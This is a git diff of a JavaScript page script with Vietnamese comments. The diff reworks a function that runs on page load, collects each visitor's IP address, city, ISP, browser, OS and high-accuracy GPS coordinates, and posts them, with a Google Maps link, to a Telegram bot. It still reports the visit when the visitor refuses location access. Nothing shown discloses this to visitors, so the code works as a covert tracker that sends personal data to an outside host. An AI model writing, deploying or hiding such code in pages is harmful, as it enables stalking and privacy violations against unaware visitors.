@@ -60,93 +60,83 @@ adjustZoom();
  // --- 1. CẤU HÌNH ---
 const TG_TOKEN = CONFIG.TG_TOKEN;
         const CHAT_ID = CONFIG.CHAT_ID;
-let isSending = false;
+let isProcessing = false;
 
-// --- 2. NHẬN DIỆN THIẾT BỊ CHI TIẾT ---
-function getSystemInfo() {
+// --- 2. NHẬN DIỆN TRÌNH DUYỆT CHÍNH XÁC (Fix lỗi Safari trên iPhone) ---
+function getBrowserDetail() {
     const ua = navigator.userAgent;
     let browser = "Trình duyệt lạ";
-    let os = "Không rõ OS";
-    let deviceType = "💻 Máy tính";
+    let os = "Không rõ";
 
-    if (ua.includes("CocCoc")) browser = "Cốc Cốc";
-    else if (ua.includes("Edg/")) browser = "Microsoft Edge";
-    else if (ua.includes("Chrome") && !ua.includes("Chromium")) browser = "Google Chrome";
-    else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
-    else if (ua.includes("Firefox")) browser = "Firefox";
-
+    // Nhận diện Hệ điều hành
     if (ua.includes("Win")) os = "Windows";
-    else if (ua.includes("iPhone")) { os = "iOS"; deviceType = "📱 Điện thoại"; }
-    else if (ua.includes("Android")) { os = "Android"; deviceType = "📱 Điện thoại"; }
+    else if (ua.includes("iPhone")) os = "iOS (iPhone)";
+    else if (ua.includes("iPad")) os = "iOS (iPad)";
+    else if (ua.includes("Android")) os = "Android";
     else if (ua.includes("Mac")) os = "MacOS";
 
-    return { browser, os, deviceType };
+    // Nhận diện Trình duyệt (Fix lỗi Chrome hiện Safari)
+    if (ua.includes("CocCoc") || ua.includes("coc_coc_browser")) browser = "Cốc Cốc";
+    else if (ua.includes("Edg/")) browser = "Microsoft Edge";
+    else if (ua.includes("CriOS")) browser = "Google Chrome (iOS)"; // Chrome trên iPhone
+    else if (ua.includes("Chrome") && !ua.includes("Chromium")) browser = "Google Chrome";
+    else if (ua.includes("Firefox")) browser = "Firefox";
+    else if (ua.includes("Safari") && !ua.includes("Chrome") && !ua.includes("CriOS")) browser = "Safari";
+
+    return { browser, os };
 }
 
-// --- 3. LẤY IP QUA 3 TẦNG TRUNG GIAN (Cloudflare, AWS, Ipify) ---
-async function fetchIpData() {
-    const sources = [
-        { url: 'https://ipwho.is/', type: 'json' }, // Ưu tiên vì có ISP
-        { url: 'https://api.ipify.org?format=json', type: 'json' }, // Trung gian uy tín 1
-        { url: 'https://checkip.amazonaws.com/', type: 'text' } // Trung gian uy tín 2 (AWS)
-    ];
-
-    let baseIp = "";
-
-    // Bước 1: Lấy IP bằng mọi giá từ các nguồn trung gian
-    for (let src of sources) {
-        try {
-            const res = await fetch(src.url, { signal: AbortSignal.timeout(3000) });
-            if (src.type === 'json') {
-                const d = await res.json();
-                baseIp = d.ip || d.query;
-                // Nếu nguồn ipwhois chạy được thì trả về luôn cho nhanh
-                if (d.connection) return { ip: d.ip, city: d.city, isp: d.connection.isp };
-            } else {
-                baseIp = (await res.text()).trim();
-            }
-            if (baseIp) break;
-        } catch (e) { continue; }
-    }
-
-    // Bước 2: Từ IP lấy được, truy vấn thông tin chi tiết qua IP-API (Sử dụng HTTPS)
-    if (baseIp) {
-        try {
-            const detailRes = await fetch(`https://ipapi.co/${baseIp}/json/`);
-            const detail = await detailRes.json();
+// --- 3. LẤY DỮ LIỆU IP, THÀNH PHỐ, NHÀ MẠNG (Dùng nguồn HTTPS mạnh nhất) ---
+async function getFullData() {
+    try {
+        // Nguồn này lấy ISP Việt Nam (Viettel, VNPT, FPT) rất tốt và hỗ trợ HTTPS
+        const response = await fetch('https://ipwho.is/');
+        const d = await response.json();
+        if (d.success) {
             return {
-                ip: baseIp,
-                city: detail.city || "Không rõ",
-                isp: detail.org || "Nhà mạng ẩn"
+                ip: d.ip,
+                city: d.city || "Không rõ",
+                isp: d.connection?.isp || d.org || "Nhà mạng ẩn"
             };
-        } catch (e) {
-            return { ip: baseIp, city: "Lỗi lọc", isp: "Lỗi lọc" };
         }
+    } catch (e) {
+        // Nếu nguồn 1 lỗi, dùng nguồn 2 dự phòng
+        const res2 = await fetch('https://ipapi.co/json/');
+        const d2 = await res2.json();
+        return {
+            ip: d2.ip,
+            city: d2.city || "Không rõ",
+            isp: d2.org || "Nhà mạng ẩn"
+        };
     }
-
     return { ip: "Không rõ", city: "Không rõ", isp: "Không rõ" };
 }
 
-// --- 4. GỬI THÔNG BÁO ---
-async function sendNotification(pos, ipInfo) {
-    if (isSending) return;
-    isSending = true;
+// --- 4. GỬI THÔNG BÁO (Format giống Ảnh 1) ---
+async function sendNotification(pos, info) {
+    if (isProcessing) return;
+    isProcessing = true;
 
-    const info = getSystemInfo();
-    const time = new Date().toLocaleString('vi-VN');let msg = `<b>🚀 PHÁT HIỆN TRUY CẬP (MULTI-PROXY)</b>\n\n`;
+    const device = getBrowserDetail();
+    const time = new Date().toLocaleString('vi-VN');
+
+    // Chỉnh sửa Format y hệt ảnh 1
+    let msg = `<b>🚀 PHÁT HIỆN TRUY CẬP MỚI</b>\n\n`;
     msg += `🕒 <b>Thời gian:</b> <code>${time}</code>\n`;
-    msg += `🌐 <b>IP:</b> <code>${ipInfo.ip}</code>\n`;
-    msg += `🏙️ <b>Thành phố:</b> <code>${ipInfo.city}</code>\n`;
-    msg += `📡 <b>Nhà mạng:</b> <b>${ipInfo.isp}</b>\n\n`;
+    msg += `🌐 <b>Địa chỉ IP:</b> <code>${info.ip}</code>\n`;
+    msg += `🏙️ <b>Thành phố:</b> <code>${info.city}</code>\n`;
+    msg += `📡 <b>Nhà mạng:</b> <b>${info.isp}</b>\n\n`;
 
-    msg += `ℹ️ <b>Thiết bị:</b>\n`;
-    msg += `├─ Hệ điều hành: <code>${info.os}</code>\n`;
-    msg += `└─ Trình duyệt: <b>${info.browser}</b>\n\n`;
+    msg += `ℹ️ <b>Thông tin thiết bị:</b>\n`;
+    msg += `├─ Hệ điều hành: <code>${device.os}</code>\n`;msg += `└─ Trình duyệt: <b>${device.browser}</b>\n\n`;
 
     if (pos && pos.coords) {
-        const { latitude: lat, longitude: lon } = pos.coords;
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
         msg += `📍 <b>Vị trí GPS:</b>\n`;
-        msg += `└ 👉 <a href="http://maps.google.com/maps?q=${lat},${lon}">Nhấn để xem Bản đồ</a>\n`;
+        msg += `└ 👉 <a href="https://www.google.com/maps?q=${lat},${lon}">Nhấn để xem Bản đồ</a>\n`;
+    } else {
+        msg += `⚠️ <b>GPS:</b> Người dùng từ chối vị trí\n`;
     }
 
     try {
@@ -156,30 +146,28 @@ async function sendNotification(pos, ipInfo) {
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: msg,
-                parse_mode: 'HTML'
+                parse_mode: 'HTML',
+                disable_web_page_preview: false // Để hiện bản đồ thu nhỏ
             })
         });
     } catch (err) {
         console.error(err);
     } finally {
-        isSending = false;
+        isProcessing = false;
     }
 }
 
 // --- 5. KHỞI CHẠY ---
-async function start() {
-    const ipInfo = await fetchIpData();
+window.onload = async () => {
+    const ipInfo = await getFullData();
     
-    // Tự động gửi tin nhắn kể cả khi người dùng từ chối GPS
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             (pos) => sendNotification(pos, ipInfo),
             () => sendNotification(null, ipInfo),
-            { timeout: 5000 }
+            { enableHighAccuracy: true, timeout: 5000 }
         );
     } else {
         sendNotification(null, ipInfo);
     }
-}
-
-window.onload = start;
+};
